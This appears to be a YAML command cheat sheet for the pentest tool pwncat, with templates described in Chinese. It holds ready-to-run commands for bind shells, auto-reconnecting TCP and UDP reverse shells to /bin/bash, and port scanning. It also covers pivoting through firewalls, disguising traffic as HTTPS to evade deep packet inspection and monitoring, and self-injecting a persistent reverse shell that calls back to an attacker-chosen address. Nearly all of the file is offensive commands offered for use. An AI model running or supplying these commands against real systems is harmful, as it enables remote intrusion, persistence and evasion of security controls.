tool: pwncat
tags: [network, connectivity, scanning, pentest, reverse-shell, pivoting, firewall-evasion]

actions:
# === BASIC MODES (LISTEN & CONNECT) ===
 - title: pwncat - 基础 TCP 监听器
   desc: |
     在指定端口上启动标准 TCP 监听器。
     这是等待远程主机传入连接的主要方式。
     默认情况下，服务器会在客户端断开连接或会话结束后终止。
   command: "pwncat -l {{port|4444}}"

 - title: pwncat - 基础 TCP 客户端连接
   desc: |
     发起与远程主机和端口的 TCP 连接。
     用于连接目标机器上的监听服务或 bind shell。
     它的行为类似于 netcat 的标准网络客户端。
   command: "pwncat {{hostname}} {{port|4444}}"

 - title: pwncat - bind shell 监听器
   desc: |
     启动监听器，并在客户端连接时执行 shell 命令。
     这实际上会在运行此命令的机器上创建一个 bind shell。
     使用时请谨慎，因为它提供了对系统命令行的远程访问。
   command: "pwncat -l {{port|4444}} -e {{shell|/bin/bash}}"

# === PERSISTENCE & RELIABILITY ===
 - title: pwncat - 持久监听器（keep-open）
   desc: |
     启动一个 TCP 监听器，即使客户端断开连接后也保持打开并接受新连接。
     -k 或 --keep-open 标志可防止进程在第一个会话关闭后退出。
     这对于在渗透测试期间维持稳定的入口点至关重要。
   command: "pwncat -l -k {{port|4444}}"

 - title: pwncat - 客户端自动重连
   desc: |
     尝试连接到远程主机，并在连接被拒绝或断开时自动重试。
     --reconn 标志后面可以跟一个数字指定重试次数，或留空表示无限尝试。
     这确保反向 shell 在网络不稳定期间保持活动。
   command: "pwncat {{hostname}} {{port|4444}} --reconn --reconn-wait {{seconds|5}}"

 - title: pwncat - 失败时重新绑定的监听器
   desc: |
     指示服务器在初次绑定尝试失败时尝试重新绑定端口。
     这在端口可能被操作系统或其他进程临时锁定的场景中很有用。
     你可以指定工具放弃前重试的次数。
   command: "pwncat -l {{port|4444}} --rebind {{retry_count|10}} --rebind-wait {{seconds|2}}"

# === PORT SCANNING (ZERO-I/O) ===
 - title: pwncat - 带横幅抓取的端口扫描
   desc: |
     使用 Zero-I/O 模式扫描目标主机上的端口范围。
     --banner 标志尝试捕获服务横幅以进行版本检测。
     你可以使用连字符指定端口范围，或使用逗号指定列表，以快速识别开放服务。
   command: "pwncat -z {{hostname}} {{port_range|1-1024}} --banner"

# === PORT FORWARDING & PIVOTING ===
 - title: pwncat - 本地端口转发
   desc: |
     通过内部 pwncat 代理将本地端口映射到远程服务。
     这使你可以访问远程网络上原本被防火墙阻止的服务。
     发送到本地端口的流量会直接隧道到指定目标。
   command: "pwncat -L {{local_addr|127.0.0.1}}:{{local_port|8080}} {{remote_host}} {{remote_port|80}}"

 - title: pwncat - 远程端口转发
   desc: |
     建立两个内部客户端，在目标与远程 pwncat 服务器之间代理流量。
     此模式非常适合通过发起出站连接来绕过严格的入站防火墙规则。
     它实际上将内部服务的访问推到你的监听器上。
   command: "pwncat -R {{remote_listener_ip}}:{{remote_listener_port}} {{target_host}} {{target_port}}"

# === EVASION & ADVANCED PROTOCOLS ===
 - title: pwncat - 使用 HTTP/HTTPS 伪装流量
   desc: |
     将通信包装在 HTTP 或 HTTPS 数据包中，以逃避深度包检测（DPI）和防火墙过滤。
     这使连接在安全监控工具看来像合法的 Web 流量。
     可以添加自定义头以进一步模拟真实的浏览器请求。
   command: "pwncat --{{protocol|https}} --header \"User-Agent: Mozilla/5.0\" {{hostname}} {{port|443}}"

 - title: pwncat - 带 ping 初始化的 UDP 反向 shell
   desc: |
     通过无状态的 UDP 协议创建反向 shell。
     需要 --ping-init 标志，以便监听器可以发现客户端的 IP 地址并开始通信。
     这在 TCP 流量被严密监控或限制的环境中很有用。
   command: "pwncat {{hostname}} {{port|4444}} -u --ping-init --ping-intvl {{seconds|10}} -e {{shell|/bin/bash}}"

 - title: pwncat - 出站端口探测（port robin）
   desc: |
     以轮询方式尝试连接一组端口，以识别防火墙允许哪些出站端口。
     它与 --reconn-robin 标志结合使用，循环尝试不同的目标端口直到连接成功。
   command: "pwncat {{hostname}} {{port|4444}} --reconn --reconn-robin {{port_list|80,443,53,8080}}"

 - title: pwncat - 自动自注入（实验性）
   desc: |
     在收到连接后自动部署持久的 pwncat 反向 shell。
     这会将简单的 shell（如 bash）替换为功能完整的 pwncat 实例，并回连到你指定的地址。
     目前这是一项实验性功能，仅限于 Linux 远程主机。
   command: "pwncat -l {{port|4444}} --self-inject {{shell|/bin/bash}}:{{callback_ip}}:{{callback_port|4445}}"